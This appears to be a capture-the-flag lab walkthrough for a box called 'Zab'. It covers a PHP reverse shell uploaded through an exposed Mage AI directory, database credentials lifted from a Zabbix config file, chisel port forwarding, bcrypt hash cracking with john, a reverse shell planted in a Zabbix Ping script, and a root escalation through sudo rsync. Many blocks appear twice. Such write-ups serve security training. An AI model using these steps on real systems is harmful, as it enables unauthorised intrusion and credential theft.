Zab

Zab

The web application on port 6789 is mage ai 0.9.57. The directory is open and we can use it to upload PHP files:

Browsing to the shell.php returns the following:

Upload this PHP reverse shell. Then start a listener and send a curl request to obtain a reverse shell connection:

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ curl http://192.168.222.210/shell.php

.......SNIP........


┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.222.210] 48382
SOCKET: Shell has connected! PID: 1709

whoami
www-data

whereis python
python:
┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ curl http://192.168.222.210/shell.php

.......SNIP........


┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.222.210] 48382
SOCKET: Shell has connected! PID: 1709

whoami
www-data

whereis python
python:

When looking at the configuration files of Zabbix, I notice the following credentials of the MYSQL application:

cat zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']			= 'MYSQL';
$DB['SERVER']			= 'localhost';
$DB['PORT']			= '0';
$DB['DATABASE']			= 'zabbix';
$DB['USER']			= 'zabbix';
$DB['PASSWORD']			= 'breadandbuttereater121';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']			= '';

// Used for TLS connection.
$DB['ENCRYPTION']		= false;
$DB['KEY_FILE']			= '';
$DB['CERT_FILE']		= '';
$DB['CA_FILE']			= '';
$DB['VERIFY_HOST']		= false;
$DB['CIPHER_LIST']		= '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT']			= '';
$DB['VAULT_URL']		= '';
$DB['VAULT_PREFIX']		= '';
$DB['VAULT_DB_PATH']		= '';
$DB['VAULT_TOKEN']		= '';
$DB['VAULT_CERT_FILE']		= '';
$DB['VAULT_KEY_FILE']		= '';
$ZBX_SERVER_NAME		= 'zabbix server';

$IMAGE_FORMAT_DEFAULT	= IMAGE_FORMAT_PNG;
cat zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']			= 'MYSQL';
$DB['SERVER']			= 'localhost';
$DB['PORT']			= '0';
$DB['DATABASE']			= 'zabbix';
$DB['USER']			= 'zabbix';
$DB['PASSWORD']			= 'breadandbuttereater121';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']			= '';

// Used for TLS connection.
$DB['ENCRYPTION']		= false;
$DB['KEY_FILE']			= '';
$DB['CERT_FILE']		= '';
$DB['CA_FILE']			= '';
$DB['VERIFY_HOST']		= false;
$DB['CIPHER_LIST']		= '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT']			= '';
$DB['VAULT_URL']		= '';
$DB['VAULT_PREFIX']		= '';
$DB['VAULT_DB_PATH']		= '';
$DB['VAULT_TOKEN']		= '';
$DB['VAULT_CERT_FILE']		= '';
$DB['VAULT_KEY_FILE']		= '';
$ZBX_SERVER_NAME		= 'zabbix server';

$IMAGE_FORMAT_DEFAULT	= IMAGE_FORMAT_PNG;

MySQL port is open on 3306. Transfer chisel to the machine then setup port forwarding:

./chisel client 192.168.45.189:8448 R:3306:127.0.0.1:3306
2026/02/17 17:44:44 client: Connecting to ws://192.168.45.189:8448
2026/02/17 17:44:44 client: Connected (Latency 8.078822ms)

....SNIP....


┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ sudo ./chisel server --reverse -v -p 8448 
2026/02/17 12:44:26 server: Reverse tunnelling enabled
2026/02/17 12:44:26 server: Fingerprint sGCUcB1V2RLMetkdux4V8jtdFu0n2mxJum3BUoyt5Jc=
2026/02/17 12:44:26 server: Listening on http://0.0.0.0:8448
2026/02/17 12:44:43 server: session#1: Handshaking with 192.168.222.210:36428...
2026/02/17 12:44:43 server: session#1: Verifying configuration
2026/02/17 12:44:43 server: session#1: tun: Created
2026/02/17 12:44:43 server: session#1: tun: proxy#R:3306=>3306: Listening
2026/02/17 12:44:43 server: session#1: tun: Bound proxies
2026/02/17 12:44:43 server: session#1: tun: SSH connected
2026/02/17 12:46:46 server: session#1: tun: proxy#R:3306=>3306: conn#1: Open
2026/02/17 12:46:46 server: session#1: tun: proxy#R:3306=>3306: conn#1: Close (sent 0B received 95B)
2026/02/17 12:47:32 server: session#1: tun: proxy#R:3306=>3306: conn#2: Open
2026/02/17 12:47:32 server: session#1: tun: proxy#R:3306=>3306: conn#2: Close (sent 2.55KB received 3.02KB)
2026/02/17 12:49:28 server: session#1: tun: proxy#R:3306=>3306: conn#3: Open
./chisel client 192.168.45.189:8448 R:3306:127.0.0.1:3306
2026/02/17 17:44:44 client: Connecting to ws://192.168.45.189:8448
2026/02/17 17:44:44 client: Connected (Latency 8.078822ms)

....SNIP....


┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ sudo ./chisel server --reverse -v -p 8448 
2026/02/17 12:44:26 server: Reverse tunnelling enabled

Now we can connect to the MySQL instance from our machine using the credentials zabbix:breadandbuttereater121:

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ mysql -u zabbix -h localhost -P 3306 --skip-ssl-verify-server-cert -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 49

| mysql              |
| performance_schema |
| sys                |
| zabbix             |

5 rows in set (0.009 sec)

After checking the users table inside the zabbix database, I obtained the two sets of password hashes:

MySQL [zabbix]> select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$KA6iPN5sY5.Z4KLerN7XOOO1P7jR8MD2e0SqNRXOsJjV1b.8c5Si. |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |            NULL |              0 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |            NULL |              0 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
2 rows in set (0.008 sec)

MySQL [zabbix]> 
MySQL [zabbix]> select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+

|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |            NULL |              0 |

2 rows in set (0.008 sec)

MySQL [zabbix]>

After cracking it offline, I obtained the password dinosaur beloning to the user administrator:

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (?)     
dinosaur         (?)     
2g 0:00:01:51 DONE (2026-02-17 12:54) 0.01800g/s 51.36p/s 94.14c/s 94.14C/s dreamgirl..indians
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (?)     
dinosaur         (?)     
2g 0:00:01:51 DONE (2026-02-17 12:54) 0.01800g/s 51.36p/s 94.14c/s 94.14C/s dreamgirl..indians
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

Accessing the /zabbix directory from my machine returns the following error message:

However, I notice I get the entire webpage when I send a cURL request against the /zabbix directory using the exploit session:

curl http://localhost/zabbix/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3888  100  3888    0     0  31235      0 --:--:-- --:--:-- --:--:-- 31354

            const PHP_ZBX_FULL_DATE_TIME = "Y-m-d h:i:s A";
            const PHP_TZ_OFFSETS = [0];
        </script><script src="js/browsers.js?1740466437"></script></head>
<body><div class="wrapper"><main><div class="server-name">zabbix server</div><div class="signin-container"><div class="signin-logo"><div class="zabbix-logo"></div></div><form method="post" action="index.php" accept-charset="utf-8" aria-label="Sign in"><ul><li><label for="name">Username</label><input type="text" id="name" name="name" value="" maxlength="255" autofocus="autofocus"></li><li><label for="password">Password</label><input type="password" id="password" name="password" value="" maxlength="255" autocomplete="off"></li><li><input type="checkbox" id="autologin" name="autologin" value="1" class="checkbox-radio" checked="checked"><label for="autologin"><span></span>Remember me for 30 days</label></li><li><button type="submit" id="enter" name="enter" value="Sign in">Sign in</button></li></ul></form></div><div class="signin-links"><a target="_blank" rel="noopener noreferrer" class="grey link-alt" href="https://www.zabbix.com/documentation/7.2/">Help</a>&nbsp;&nbsp;&bullet;&nbsp;&nbsp;<a target="_blank" rel="noopener noreferrer" class="grey link-alt" href="https://www.zabbix.com/support">Support</a></div></main><footer role="contentinfo">&copy; 2001&ndash;2025, <a class="grey link-alt" target="_blank" rel="noopener noreferrer" href="https://www.zabbix.com/">Zabbix SIA</a></footer></div></body>

Setup another reverse port forwarding to the port 80:

./chisel client 192.168.45.189:8449 R:80:127.0.0.1:80
2026/02/17 18:02:53 client: Connecting to ws://192.168.45.189:8449
2026/02/17 18:02:53 client: Connected (Latency 6.659651ms)

.....SNIP.....

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ sudo ./chisel server --reverse -v -p 8449 
2026/02/17 13:02:32 server: Reverse tunnelling enabled
2026/02/17 13:02:32 server: Fingerprint sY13yVEhm3pEGr+pfRRMsrMjEQ75B/ZusLEfsMCTm/U=
2026/02/17 13:02:32 server: Listening on http://0.0.0.0:8449
2026/02/17 13:02:53 server: session#1: Handshaking with 192.168.222.210:48400...
2026/02/17 13:02:53 server: session#1: Verifying configuration
2026/02/17 13:02:53 server: session#1: tun: Created
2026/02/17 13:02:53 server: session#1: tun: SSH connected
2026/02/17 13:02:53 server: session#1: tun: proxy#R:80=>80: Listening
2026/02/17 13:02:53 server: session#1: tun: Bound proxies
2026/02/17 13:03:01 server: session#1: tun: proxy#R:80=>80: conn#1: Open
2026/02/17 13:03:05 server: session#1: tun: proxy#R:80=>80: conn#2: Open
./chisel client 192.168.45.189:8449 R:80:127.0.0.1:80
2026/02/17 18:02:53 client: Connecting to ws://192.168.45.189:8449
2026/02/17 18:02:53 client: Connected (Latency 6.659651ms)

.....SNIP.....

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ sudo ./chisel server --reverse -v -p 8449 
2026/02/17 13:02:32 server: Reverse tunnelling enabled
2026/02/17 13:02:32 server: Fingerprint sY13yVEhm3pEGr+pfRRMsrMjEQ75B/ZusLEfsMCTm/U=
2026/02/17 13:02:32 server: Listening on http://0.0.0.0:8449
2026/02/17 13:02:53 server: session#1: Handshaking with 192.168.222.210:48400...

And now browsing to the http://127.0.0.1/zabiix returns the login interface:

Login using Admin:dinosaur to gain access to the web interface:

As shown in the output above, Zabbix 7.2.4 is currently active.

Plant a reverse shell inside the Ping script:

Start a listener on port 21. Then execute the script by browsing over to the Monitoring tab, left-click on Zabbix server, and press Ping under the scripts:

And that is how I obtained a reverse shell connection:

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.222.210] 46934
bash: cannot set terminal process group (2393): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zab:/$ whoami
whoami
zabbix
zabbix@zab:/$ 

┌──(kali㉿kali)-[~/Desktop/Labs/Zab]
└─$ nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.222.210] 46934
bash: cannot set terminal process group (2393): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zab:/$ whoami
whoami
zabbix
zabbix@zab:/$

The zabix user can run rsync with root privileges:

zabbix@zab:/$ sudo -l
sudo -l
Matching Defaults entries for zabbix on zab:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on zab:
    (ALL : ALL) NOPASSWD: /usr/bin/rsync
zabbix@zab:/$ 

zabbix@zab:/$ sudo -l
sudo -l
Matching Defaults entries for zabbix on zab:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on zab:
    (ALL : ALL) NOPASSWD: /usr/bin/rsync
zabbix@zab:/$

Now the box is rooted:

zabbix@zab:/$ sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt
3ce67331ec9b4a1d1e881c0d7e090317


zabbix@zab:/$ sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt
3ce67331ec9b4a1d1e881c0d7e090317
